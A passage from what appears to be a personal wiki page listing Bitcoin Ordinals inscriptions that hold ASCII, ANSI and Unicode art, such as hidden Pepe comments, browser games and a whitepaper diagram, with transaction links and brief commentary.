    ⠀⠀⠀⠠⠀⠀⢀⠀⠀⠄⠐⠀⠀⡀⠁⠀⡀⠄⠈⠀⠄⠐⠀⠠⠀⠐⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠢⢌⡌⠰⣈⠛⣦⣭⣩⣍⡴⣰⠚⣭⣞⠳⢎⡳⣌⠡⠂⠀⠠⠈⠀⡐⠀⠀⠀⠄⠡⠈⠄⠀⢀⠋⠆⡖⠨⢂⠁⡐⣈⠣⢄⡈⠔⣤⢩⠰⠥⢂⠋⠌⡐⡉⢐⠠⠁⠄⠡⠈⠄⠡⠈⠄⠁⠂⠄⠂⢁⠠⠀⠐⡀⠁⠐⠀⠁⡀⠂⠀⡀⠂⠀⢀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠂⠀⠁⠀⠠⠁⠀⠀⠂⠁⠀⠂⠈⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢂⠡⠀⠃⠂⣀⠳⣌⠳⣄⣃⠓⡌⢎⢥⣿⠳⣌⡛⡬⡕⡎⡔⢁⠀⠁⠀⠄⠀⠄⠀⠈⠄⠡⠈⠄⠀⠠⢈⡐⢀⠆⣀⠒⠠⢂⠡⢒⡘⢡⠐⡄⢃⠒⢄⠣⠘⡄⡘⣀⠂⢡⠈⢂⠡⠈⠄⠡⠈⠄⡁⠂⠌⡀⠐⢈⠀⠄⠈⡀⠌⠀⠀⠄⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠁⠀⢀⠀⠀⡀⠈⠀⠐⠀⡀⠈⠀⠐⠈⠀⠄⠁⡀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⡀⠀⠄⢀⠰⢠⢉⠳⣧⢘⠻⣷⣾⣾⣞⣣⡝⢦⣙⠶⡝⣞⡴⢂⠀⠀⠂⠀⠠⡀⠀⠀⠌⠠⢁⠂⠀⠠⢁⠰⢈⠐⠠⡈⢁⠢⢁⠂⠤⢁⠊⠤⢁⠊⡐⠌⡡⠐⠄⡐⠈⡄⠌⡀⢂⠡⠈⠄⡁⠂⠄⡁⢂⠐⢈⠠⠀⢂⠀⠄⠀⠐⠀⡀⠄⠈⠀⠀⠀⠀⠀⢀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠈⠀⠀⠄⠀⡀⠁⠀⠂⠀⠄⠁⠠⠈⠀⠄⠂⠠⠀⢂⠠⠀⠁⠀⠠⠀⡁⠀⠌⢀⠡⠐⡀⠰⠀⢈⠢⡑⢎⠤⡙⡞⣧⣙⠶⣦⣍⣛⣏⡽⣣⢮⣝⠾⣱⢊⢆⠠⠈⠀⡀⠁⠀⠀⠀⠌⡐⢀⠂⠀⠐⠠⠒⢠⢁⠒⠠⡁⢂⠢⠉⡔⠨⡐⠡⠌⡐⢌⠰⢠⠉⠤⢁⠒⡀⠂⠔⡀⢂⠁⠂⠄⡁⢂⠐⠠⢈⠠⠀⢂⠀⠄⠂⠈⠀⢀⠀⠀⠀⠀⡀⠀⠁⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠁⠀⠀⠁⠀⠠⠀⢀⠀⠁⡀⠈⠀⠐⠀⠠⠁⠀⠄⠁⠠⠀⢀⠐⠀⡀⠀⠠⠀⠄⠂⠌⠀⠀⠀⡁⠠⠂⠀⢧⡙⣦⢡⠹⣌⡻⢶⣅⠻⠿⣿⣿⣷⣯⣜⣣⢧⣋⣦⠁⠄⠀⡀⠠⠀⠈⢀⠢⠐⡀⠂⠀⠈⠡⠘⡀⠂⠌⠡⠠⢁⠂⡑⠠⢃⠰⢁⠊⠔⡈⠔⠂⡅⠒⣀⠂⡐⢁⠂⡐⠠⢈⠐⠠⠐⠀⠂⡁⠄⠀⠂⠀⠄⠂⢀⠂⠁⠀⠀⡀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⢀⠀⠂⠁⠀⢀⠀⠠⠀⢀⠀⠁⡀⠂⠀⠄⠁⠠⠈⢀⠐⠀⡀⠂⠠⢀⠀⠀⠀⡀⠀⠄⠀⠀⠀⠄⠀⠀⢳⡍⣖⢫⠖⣤⡙⢳⣽⣻⢷⣦⣝⣻⠿⣿⣿⡻⢿⣿⣿⢶⠀⠀⡀⠐⠀⢀⠂⠡⢀⠡⠀⠀⡁⠆⠡⢈⠐⠡⢁⠂⢌⠠⠑⡈⠔⣁⠊⠤⢑⠨⠑⠄⡃⠄⠒⣀⠂⡐⠠⢁⠂⡈⠐⢈⠀⡁⠠⠐⠈⢀⠁⠠⠈⠀⠠⠀⠈⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⡀⠀⠈⠀⢀⠀⠄⠀⠀⠄⠀⡀⠁⠠⠈⢀⠐⢀⠀⠂⠀⠄⢁⠠⢀⠀⠀⠀⡐⠀⢂⠑⠨⠀⠀⠠⢸⣾⣾⣿⣿⣷⣯⣷⢦⣙⠿⣾⣶⣾⠿⢶⣶⣽⣳⣦⡴⣠⢂⠀⠀⡀⠀⠀⠌⡐⢀⠂⠀⠀⡐⠈⠄⠡⡈⠔⠠⢁⠂⠌⢡⠈⠆⡄⠣⡈⠆⡡⢉⠢⢁⢊⠡⢀⠂⠄⡁⢂⠐⡀⠁⢂⠠⠀⠐⠀⡁⠠⠀⠂⠀⡁⠀⠀⠂⠁⢀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠠⠐⠀⠀⠀⠂⠁⠀⠠⠀⠈⢀⠠⠀⠀⠄⠁⠠⠀⢀⠂⠀⠌⠀⡐⠀⠄⠀⢂⠀⠀⠀⠈⠀⠨⠀⠀⠐⠀⠀⣿⣿⣿⣻⡿⠿⠿⠿⡿⣿⢿⡿⡾⢿⡿⠿⢿⣻⠭⠙⠁⠁⢀⠀⠄⠀⠀⠂⡐⠠⢈⠀⠀⡐⠉⠤⢁⡐⢈⡐⠄⠊⢌⠠⠘⡠⠌⡐⢡⠘⡄⢃⠜⢠⠂⣂⠡⢈⠐⡀⢂⠐⠠⠁⠠⠐⢈⠀⠐⠀⠠⠐⠈⢀⠀⠈⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⡀⠐⠀⠀⠂⠀⠐⠈⠀⠀⠄⠁⠠⠈⢀⠐⠀⡐⠈⢀⠐⠀⡐⠈⠐⡀⠐⠀⠀⠈⠀⠂⠀⠀⠂⠀⡀⠈⠛⠿⠵⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⣀⠠⢀⠠⠀⠐⠈⠀⠀⠠⠀⠀⠀⠄⡁⢂⠀⠀⠄⢃⠰⢀⠰⢀⠐⡈⠔⠂⠌⣁⠢⠘⣀⠃⡌⠰⣁⠊⡄⢃⠄⢂⠂⡐⢀⠂⠌⡀⢁⠂⢈⠀⠠⠁⠐⠀⠠⠈⢀⠠⠈⠀⠀⠄⠀⠂⠁⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠂⠀⠈⢀⠀⠈⢀⠠⠈⢀⠐⠀⠐⠀⠠⠐⠀⡀⠂⠠⠀⠁⠄⠂⠁⡐⠀⠀⠀⡀⠁⠀⠀⢀⠀⠀⠀⡀⠀⠀⠀⠐⠀⠀⠂⠈⠀⠀⡠⢌⠣⣍⢢⡁⠀⠀⠀⠐⠀⠀⡐⠈⠠⠐⠠⠀⠀⠌⡀⠆⡈⠐⠠⢈⠐⡈⠔⠡⡀⠆⢡⠐⠌⡐⠡⢄⠃⡌⢂⠌⠄⠒⡀⠂⠌⠠⠐⠀⠄⠂⡀⠁⠄⠈⢀⠐⠀⡀⠀⢀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⢀⠀⠀⠀⡀⠈⠀⡀⠈⠀⡀⠀⠈⠀⡀⠐⠀⠠⠈⢀⠈⢀⠐⠀⠠⠀⠁⠄⠁⢂⠈⠄⠀⠂⠌⢠⠀⠀⠀⠠⠀⠀⠈⢀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠈⠀⠀⠉⠆⢁⠒⠀⢀⠈⠀⠀⠠⠀⠀⠠⠀⡁⢂⠀⠀⢂⠁⠢⢈⡐⢁⠂⠰⠐⡈⠰⢀⠊⢄⡘⢠⠡⠑⣂⠱⡐⠌⠰⢈⠐⠠⠁⠌⠠⢁⠈⠄⠂⢀⠂⠀⠁⡀⠀⠂⠀⠄⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⢀⠠⠀⠀⡀⠁⠀⡀⠁⢀⠀⠐⠈⠀⠐⠀⡀⠂⢀⠈⠀⠌⠀⠄⢁⠠⠀⠂⠁⠄⠂⡀⠌⠁⠲⢄⣠⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠄⠈⠀⢀⠐⠠⠀⠀⠂⠌⡁⢂⠐⠠⡈⢁⢂⠁⡒⢈⠐⢂⠰⢀⢊⠡⡐⠰⢈⠌⣁⠂⠌⠠⠁⠌⡐⠠⢈⠀⠌⡀⠠⠁⡀⠄⠐⠈⠀⡀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⢀⠀⠁⠀⠀⠁⠀⠀⠠⠀⢀⠀⠁⡀⠀⠂⢀⠈⢀⠈⠀⠄⠀⠂⢀⠠⠁⠐⠈⢀⠠⠀⠂⢁⠈⠠⠐⠀⠄⠡⠀⢂⠀⠠⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⢀⠂⠐⠀⢁⠀⠠⢁⠂⣀⡈⠐⡀⠂⠌⡐⠠⢁⠂⢡⠐⡈⠰⢈⡐⠌⠄⢢⠑⠨⠄⢒⠠⠌⡀⠃⠌⡐⠠⠁⢂⠈⠄⠠⠐⠀⡀⠄⠂⠈⢀⠀⠀⠄⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠂⠈⠀⠐⠀⠠⠀⠀⠄⠀⠐⠀⡀⠠⠀⠠⠈⠀⠄⠁⡀⠠⠀⢁⠈⠀⠄⠂⢁⠠⠀⢁⠠⠁⡈⢀⠂⠠⠈⠄⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠊⠄⢠⠀⠀⠁⠄⠀⠀⠈⠡⢀⢁⠢⢀⠁⠂⠌⡀⠂⠤⢁⠂⠰⠈⢌⡀⠎⣁⠊⢄⠒⠠⠁⠌⡐⠠⠁⠌⡀⢂⠠⠁⠄⠂⠀⠄⠂⠁⡀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠠⠀⠈⠀⢀⠠⠐⠀⠠⠀⠐⠀⡀⠈⠀⠄⠀⠄⠀⡁⠀⠂⢀⠂⢀⠐⠀⠄⠐⠈⡀⠐⠠⠐⠈⠠⠀⡁⠄⢀⠂⠁⠄⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠠⠁⠌⠄⠀⠠⢁⠂⠀⠀⠀⡁⠂⠄⠂⠄⠌⡈⠐⠠⢁⠂⠤⢈⡁⠎⢠⠐⡈⠤⠘⡠⢈⠡⠌⡐⠠⠁⠌⡐⠠⠀⢂⠐⢀⠂⠁⡀⠂⠁⠀⠄⠀⡀⠁⠀⠄⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⢀⠠⠀⠀⠀⠄⠀⠐⠀⡀⠄⠐⠀⡀⠂⠀⠂⠀⠄⠁⠠⠀⠂⠠⠈⡀⠌⠀⡐⠈⡀⠂⢁⠂⡁⠄⠂⠄⠂⡈⠄⠠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠈⠀⠀⠐⠀⠀⠄⠁⠄⠂⠄⠀⠂⠄⠡⢈⠐⡈⠐⠠⢉⠐⠠⢈⡐⠄⡐⠨⠄⢂⠅⠢⡑⢠⠁⠢⠐⠠⠁⠌⡐⢀⠂⡁⢂⠈⠠⠐⠀⠄⠂⠁⡀⠂⠀⢀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⡀⠠⠀⠀⠀⠀⠐⠀⡀⠈⠀⠄⠀⠄⠂⠀⠄⠀⡁⠠⠁⠠⠈⠀⠄⢁⠀⠂⠠⠀⡁⠄⠂⠄⠡⠀⠂⠄⢂⠁⢂⠁⠄⠂⡁⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠈⠀⠀⠠⠀⠂⠀⠠⠈⡐⢈⠀⠀⠈⠄⡁⢂⠐⠠⢉⠐⠠⡈⠄⠡⠐⡐⡈⠔⡈⢄⠊⡡⢐⠡⠌⢡⠈⠡⢈⠐⡀⢂⠐⠠⢀⠂⠁⠄⡁⠄⠂⠁⡀⠄⠁⡀⠀⠐⠀⠁⠀⠀⠂⠀⠀
         Michael Jackson * First Onchain Collection 9/12 * Legends @ BTC⠀⠀⠀⠀
    ```
  <a id="_827"></a>
  - 10/12 [tx 74f2b9b61d2d79bf0f3ba1f13088fb1c56cf308202afd508b6b88fe4e8b99c74](https://ordinals.com/inscription/74f2b9b61d2d79bf0f3ba1f13088fb1c56cf308202afd508b6b88fe4e8b99c74i0)
<a id="_828"></a>
- [Pepe the Frog](science.md#pepe-the-frog) themed collections:<a id="_829"></a>

  <a id="_830"></a>
  - <a id="_831"></a>
    "Hiddenpepe" collection. These are present inside HTML comments, and don't show well on [ordinals.com](#ordinals-com). But you can see them by inspecting the HTML code, e.g. at: [view-source:https://ordinals.com/content/a66a54878d428fc7bdf5758ea3bf2ebe1c76750043c22dc6ff05d7cb5a0c0a37i0](view-source:https://ordinals.com/content/a66a54878d428fc7bdf5758ea3bf2ebe1c76750043c22dc6ff05d7cb5a0c0a37i0).

    <a id="_832"></a>
    By looking at the short [JavaScript](programming-language.md#javascript) code, the page seems to select one plain background color at random, but it didn't seem to work very well, we always get the same color?

    <a id="_833"></a>
    A comment at the end of each inscription reads:<a id="_834"></a>


    > THIS IS A BEARER ASSET OWNER HAS ALL RIGHTS

    <a id="_835"></a>

    <a id="_836"></a>
    - 02 [tx 747b4a8a8b112ee1ff1d88982fcad4ea517ad5b079eb8da44bd4dae8a617c48d](https://ordinals.com/inscription/747b4a8a8b112ee1ff1d88982fcad4ea517ad5b079eb8da44bd4dae8a617c48di0)
    <a id="_837"></a>
    - 03 [tx a66a54878d428fc7bdf5758ea3bf2ebe1c76750043c22dc6ff05d7cb5a0c0a37](https://ordinals.com/inscription/a66a54878d428fc7bdf5758ea3bf2ebe1c76750043c22dc6ff05d7cb5a0c0a37i0)<a id="image-hiddenpepe03"></a>
      <img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/a66a54878d428fc7bdf5758ea3bf2ebe1c76750043c22dc6ff05d7cb5a0c0a37-0.png" alt="" height="600">

      **[Figure 87](#image-hiddenpepe03). HIDDENPEPE03**. Screenshot of the [ASCII art](#ascii-art) taken from a [terminal](software.md#terminal-emulator).
    <a id="_838"></a>
    - 04 [tx 4353581d19da64ada15a0ff9e8ded380eb5778d036c607e9055d0eb85c10ed65](https://ordinals.com/inscription/4353581d19da64ada15a0ff9e8ded380eb5778d036c607e9055d0eb85c10ed65i0)
    <a id="_839"></a>
    - 05 [tx d45422e6ce033df0895ce3945ce26b25aa4d95ecda835a2504dcaaf6352c20c8](https://ordinals.com/inscription/d45422e6ce033df0895ce3945ce26b25aa4d95ecda835a2504dcaaf6352c20c8i0)
    <a id="_840"></a>
    - 06 [tx 7650ad0da7f563bd882cd28f88654ac7484b97e63426fda1667bf15da65aad0e](https://ordinals.com/inscription/7650ad0da7f563bd882cd28f88654ac7484b97e63426fda1667bf15da65aad0ei0)
    <a id="_841"></a>
    - 08 [tx e104fb9c34e75418385f04eb7d92ed16afd45cc244923f5807ed4ca65c8f010f](https://ordinals.com/inscription/e104fb9c34e75418385f04eb7d92ed16afd45cc244923f5807ed4ca65c8f010fi0)
    <a id="_842"></a>
    - 09 [tx a5256054de9f80593b9b347072ce6d4a159d70f811de38a9d4a027a229d6c803](https://ordinals.com/inscription/a5256054de9f80593b9b347072ce6d4a159d70f811de38a9d4a027a229d6c803i0)
  <a id="_843"></a>
  - "Pistol Pepe": these simple browser games contain an ASCII art as an HTML comment. The are signed "[https://www.twitter.com/tewz1](https://www.twitter.com/tewz1) [https://tewz.cent.co/](https://tewz.cent.co/)" (twitter "Account suspended" as of April 2024).<a id="_844"></a>

    <a id="_845"></a>
    - [tx dbd3f4a6b59e31cef45f33232caa3e9f9b354047e907591354550baf5c7ae98e](https://ordinals.com/inscription/dbd3f4a6b59e31cef45f33232caa3e9f9b354047e907591354550baf5c7ae98ei0): [cowboy](https://ourbigbook.com/go/topic/cowboy) themed
    <a id="_846"></a>
    - [tx a6b3180e61eee3944681ae1dc5475997fd6509ac764b0066a6c32abe7a7ae859](https://ordinals.com/inscription/a6b3180e61eee3944681ae1dc5475997fd6509ac764b0066a6c32abe7a7ae859i0): day [Egypt](https://ourbigbook.com/go/topic/egypt) themed
    <a id="_847"></a>
    - [tx 27639c588bf8a5f917bc95dbbb66f20ea2a5034cb5c3ba3f3fad96ebb47e336c](https://ordinals.com/inscription/27639c588bf8a5f917bc95dbbb66f20ea2a5034cb5c3ba3f3fad96ebb47e336ci0): night [Egypt](https://ourbigbook.com/go/topic/egypt) themed

<a id="_848"></a>
[ANSI art](art.md#ansi-art). These can only be viewed on a [terminal](software.md#terminal-emulator):<a id="_849"></a>

<a id="_850"></a>
- [tx 2a319ec83d8e93cd8003a8d087514a0f775b7314128fbdf4d59aad2f9664ac04](https://ordinals.com/inscription/2a319ec83d8e93cd8003a8d087514a0f775b7314128fbdf4d59aad2f9664ac04i0): [Pepe the Frog](science.md#pepe-the-frog) with lots of terminal blink on the background, quite cool<a id="image-pepe-the-frog-ansi-art"></a>
  <img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/2a319ec83d8e93cd8003a8d087514a0f775b7314128fbdf4d59aad2f9664ac04-0.gif" alt="" height="600">

  **[Figure 88](#image-pepe-the-frog-ansi-art). Pepe the Frog ANSI art**. Screenshot of the [ANSI art](art.md#ansi-art) taken from a [terminal](software.md#terminal-emulator).
<a id="_851"></a>
- [tx 2a96eb44afce6028cbb6c1a639c9e93cf40a58e2bdc97f9d642fa0ec5713507a](https://ordinals.com/inscription/2a96eb44afce6028cbb6c1a639c9e93cf40a58e2bdc97f9d642fa0ec5713507ai0): "incoming call [Satoshi Nakamoto](cryptocurrency.md#satoshi-nakamoto)" has the image of a man in suite with some dark terminal colors, pretty cool

<a id="_852"></a>
[ASCII porn](#ascii-porn):<a id="_853"></a>

<a id="_854"></a>
- [tx de57a32fcae4c20c16ebb9782ecc550f199e2f7d3a2149188945b21fcff99177](https://ordinals.com/inscription/de57a32fcae4c20c16ebb9782ecc550f199e2f7d3a2149188945b21fcff99177i0); man drinking with while pulling out his huge dick

<a id="_855"></a>
Misc:<a id="_856"></a>

<a id="_857"></a>
- [tx 9089c4fac49593628e1334bbfe94080819bdac67eac18c9ffece5a2bc235a380](https://ordinals.com/inscription/9089c4fac49593628e1334bbfe94080819bdac67eac18c9ffece5a2bc235a380i0): wizard taking a shower
<a id="_858"></a>
- [tx fdf9b82e3177c5404f8251ad26460788fc8b29cc4cbd4951ea5e8438dcce9631](https://ordinals.com/inscription/fdf9b82e3177c5404f8251ad26460788fc8b29cc4cbd4951ea5e8438dcce9631i0): and [tx 2031b40ccb3944822be709c9a41f38e10ddf13c577b3f2c4d2046ac73020f6f9](https://ordinals.com/inscription/2031b40ccb3944822be709c9a41f38e10ddf13c577b3f2c4d2046ac73020f6f9i0) middle finger [Unicode art](art.md#unicode-art).  Both marked "THE MIDDLE 1/15".<a id="image-the-middle-1-15"></a>
  <img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/fdf9b82e3177c5404f8251ad26460788fc8b29cc4cbd4951ea5e8438dcce9631-0.png" alt="" height="500">

  **[Figure 89](#image-the-middle-1-15). THE MIDDLE 1/15**. Screenshot taken from [https://ordinals.com/content/fdf9b82e3177c5404f8251ad26460788fc8b29cc4cbd4951ea5e8438dcce9631i0](https://ordinals.com/content/fdf9b82e3177c5404f8251ad26460788fc8b29cc4cbd4951ea5e8438dcce9631i0).
<a id="_859"></a>
- [tx ed3bd1a0cd8a18743acfd7162649a43b69f25a540fbfe6a2352a612ebfb381e6](https://ordinals.com/inscription/ed3bd1a0cd8a18743acfd7162649a43b69f25a540fbfe6a2352a612ebfb381e6i0): [JavaScript](programming-language.md#javascript) that generates a [demoscene](https://ourbigbook.com/go/topic/demoscene) [ASCII art](#ascii-art) animation that looks like a rotating thing
<a id="_860"></a>
- [tx 78240e4691c7f75311a03125567f1e44fc0049db611f0ac554f04f8790e28e24](https://ordinals.com/inscription/78240e4691c7f75311a03125567f1e44fc0049db611f0ac554f04f8790e28e24i0): cute cartoon dog giving wearing a headband and giving thumbs up. The [Chinese](linguistics.md#chinese-language) subtitle reads:<a id="_861"></a>
  > 买海豹胆小鬼

  which [Google Translate](google.md#google-translate) translates as:<a id="_862"></a>
  > A coward who buys seals

  TODO context. Sample hit at: [https://twitter.com/0xTenkito/status/1612939684816031746](https://twitter.com/0xTenkito/status/1612939684816031746)
<a id="_863"></a>
- [tx 3a474f540c1917817fba51d2f9fd647887c8c3cd9687eb8d34ab6787c9e8a7fa](https://ordinals.com/inscription/3a474f540c1917817fba51d2f9fd647887c8c3cd9687eb8d34ab6787c9e8a7fai0): ASCII art of mysterious man typing on his laptop. [Satoshi](cryptocurrency.md#satoshi-nakamoto) comes to mind. The man's hat contains the following Korean characters;<a id="_864"></a>
  > 진실로같이가요

  which [Google Translate](google.md#google-translate) translates as:<a id="_865"></a>
  > Let's go together truly
<a id="_866"></a>
- [tx 18b7728f32ff27d410e57e289bca7b8c2bdf7c30a1c572a41acc1a8ff576b6ab](https://ordinals.com/inscription/18b7728f32ff27d410e57e289bca7b8c2bdf7c30a1c572a41acc1a8ff576b6abi0): "I Want you BTC Maxis, Ordinal Army Enlist Now"
<a id="_867"></a>
- [tx 2fc46b52e3ab7a1053c4c65a4dc3af6bb7e51eb15cb988294af3a203ad254eed](https://ordinals.com/inscription/2fc46b52e3ab7a1053c4c65a4dc3af6bb7e51eb15cb988294af3a203ad254eedi0): contains an ASCII art of an [Iron Man](https://ourbigbook.com/go/topic/iron-man)-like mask with text:<a id="_868"></a>
  > Did you know that within ASCII art an [encrypted](cryptography.md#encryption) msg can be inside? All you need to do is decode it. Hence a pictureworthsthousandwords.

  But hopefully/presumably the author meant [Steganography](cryptography.md#steganography) and not [encryption](cryptography.md#encryption) right? [Code 6. "Your free GrrCon ticket"](#code-your-free-grrcon-ticket) comes to mind.
<a id="_869"></a>
- [tx 6d1d99ed05a152d59fdef4eb26a4a07a4f81dcd945249639af272504b4e70d27](https://ordinals.com/inscription/6d1d99ed05a152d59fdef4eb26a4a07a4f81dcd945249639af272504b4e70d27i0): [Bitcoin whitepaper](cryptocurrency.md#bitcoin-whitepaper) as Markdown, but with some great [Unicode art](art.md#unicode-art) rendition of the diagrams!<a id="_870"></a>

  ```
        ┌─────────────────────┐               ┌─────────────────────┐              ┌─────────────────────┐
        │                     │               │                     │              │                     │
        │    Transaction      │               │    Transaction      │              │    Transaction      │
        │                     │               │                     │              │                     │
        │   ┌─────────────┐   │               │   ┌─────────────┐   │              │   ┌─────────────┐   │
        │   │ Owner 1's   │   │               │   │ Owner 2's   │   │              │   │ Owner 3's   │   │
        │   │ Public Key  │   │               │   │ Public Key  │   │              │   │ Public Key  │   │
        │   └───────┬─────┘   │               │   └───────┬─────┘   │              │   └───────┬─────┘   │
        │           │    .    │               │           │    .    │              │           │         │
  ──────┼─────────┐ │    .    ├───────────────┼─────────┐ │    .    ├──────────────┼─────────┐ │         │
        │         │ │    .    │               │         │ │    .    │              │         │ │         │
        │      ┌──▼─▼──┐ .    │               │      ┌──▼─▼──┐ .    │              │      ┌──▼─▼──┐      │
        │      │ Hash  │ .    │               │      │ Hash  │ .    │              │      │ Hash  │      │
        │      └───┬───┘ .    │    Verify     │      └───┬───┘ .    │    Verify    │      └───┬───┘      │
        │          │     ............................    │     ...........................    │          │
        │          │          │               │     │    │          │              │     │    │          │
        │   ┌──────▼──────┐   │               │   ┌─▼────▼──────┐   │              │   ┌─▼────▼──────┐   │
        │   │ Owner 0's   │   │      Sign     │   │ Owner 1's   │   │      Sign    │   │ Owner 2's   │   │
        │   │ Signature   │   │      ...........─►│ Signature   │   │     ...........─►│ Signature   │   │
        │   └─────────────┘   │      .        │   └─────────────┘   │     .        │   └─────────────┘   │
        │                     │      .        │                     │     .        │                     │
        └─────────────────────┘      .        └─────────────────────┘     .        └─────────────────────┘
                                     .                                    .
            ┌─────────────┐          .            ┌─────────────┐         .            ┌─────────────┐
            │ Owner 1's   │...........            │ Owner 2's   │..........            │ Owner 3's   │
            │ Private Key │                       │ Private Key │                      │ Private Key │
            └─────────────┘                       └─────────────┘                      └─────────────┘
  ```
<a id="_871"></a>
- [tx e643b2a25b6df9c1d5b0fad7168677a71b96544707efab16f0cf0266981cbe53](https://ordinals.com/inscription/e643b2a25b6df9c1d5b0fad7168677a71b96544707efab16f0cf0266981cbe53i0): "Dear [Luke Dashjr](cryptocurrency.md#luke-dashjr), here’s why I want to join the [@TaprootWizards](#taproot-wizards)"
<a id="_872"></a>
- [tx 6987171da8a07b365686f3ec25ccc08f731943eecbbebed0c9b0df63b58d69fe](https://ordinals.com/inscription/6987171da8a07b365686f3ec25ccc08f731943eecbbebed0c9b0df63b58d69fei0): classical painting of a nude female model marked "By Johnny Dollar J$"
<a id="_873"></a>
- [tx 8ae6534ba41e305fedf068696111d5445e90c48cbd18081503e831399f1a11fb](https://ordinals.com/inscription/8ae6534ba41e305fedf068696111d5445e90c48cbd18081503e831399f1a11fbi0): HTML of monkey face with bow tie and pink cheeks. Cute! The HTML code is also arranged in a monkey like pattern.
<a id="_874"></a>
- <a id="_875"></a>
  [tx d6c60f0efc9f3155712775c2a0f4e1d805f000fc50763c440cb575f252de371d](https://ordinals.com/inscription/d6c60f0efc9f3155712775c2a0f4e1d805f000fc50763c440cb575f252de371di0): also seen at: [https://www.h17n.art/](https://www.h17n.art/): HTML with the busts of a few people who strongly criticized [Bitcoin](cryptocurrency.md#bitcoin): [Warren Buffet](https://ourbigbook.com/go/topic/warren-buffet), "Paul Krugman", "Christine Lagarde" and "Peter Schiff":<a id="_876"></a>


  > <a id="_877"></a>
  > HYPERBITCOINIZATION
  > 
  > <a id="_878"></a>
  > A collection of 17 text inscriptions blessed by the most diligent bitcoin evangelists

  <a id="_879"></a>
  ```
                                                   ., ..,     ,
                                           ,..,  *,.  ,***/,..,/...,.
                                           ,.//(////*/#((//(##%#*   .  . .
                                      ,.**&&&&&%#%#%%%%%%###%%%%(//*,.  .         .
                                ..**/%&@&%&&@&@&@&@@&&&%%%%#%%&%%####/   ...
                         .,,.,(//(&&&&&&&&&&&&&@@&&%#%&(%%##%#%##%%%#((#(*  .,
                         /*(*(%&&&&&&&&&&&&@@@&@&&%%%%%%##((########(#((/(//,. *
                    .  .,(((%&@&&&@&&&&&&&&&&&@&&&%%#%####%##(((((((#(###((/*****.../   .
                   .,,(%&&&&&&&&&&@@@@@@@@&&&%%#%######(#%#(#(###(((((#((#(#(((//##//*,,, .
                ,, %%&%&&&&@&&@&@&%#@########%##(((((((#((((#(((#((((((#(#####(//(##(#((// *..
                ,.(%&&&&&&&@&&&&%&%%%%&&%&%%%%%%%&&&%%%%%%%%########((#######(#((/(((#%(#(((*.
             *  **%&&&&&&&&%%@%%&&&&&&&&&&&&&&&&&&&&&%%%%%%%%##%##############(#(/##((####(((/,.
            *  .#&&%&&%@&&%&&&&&&&&&&&&&&&&&&&&&&%%%%%%%%%#%%%%%#######((#####%#(//(((#((##((/((,
            , .%&%&&%&&%%&&@&&&&&@&&&&&&&&&&&&&&&&%%%%%%%%##%%%##(####(##(#(##%(((*(((###(#(/((/((#,
            .,&%%&%&%##&&@&&&&&&&&&&&&%&&&&&&&&@&&&&%%%%%%%%#######(####(((####/#/(/(#(((##(/(((((#(/*
            .#%#%&&&#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%%%#%%%%#######(#####(((##(#(/%/(//(#///(((/(((((((/.
            *(#%&&%%%%&&&&&&&&&&&&&&&&&&&&&&&&&&&%%%%%#%%#####(##((#((((((((####(/((/((##/((((//(/((((/*
            ,###%%##%%&&&&&&&&&&&&&&&&&&&&&&&&&&%%%%%#########(#(((((((((((((%##(///*/((#/(#/((/(///(/**.
            */#%%%%%&&&&&&&&&&&&&&&&&&&&&&&&&&&%&%#%%#%#########(#(#((((/((//(//#(#(/((/*//(((#(/*,,****
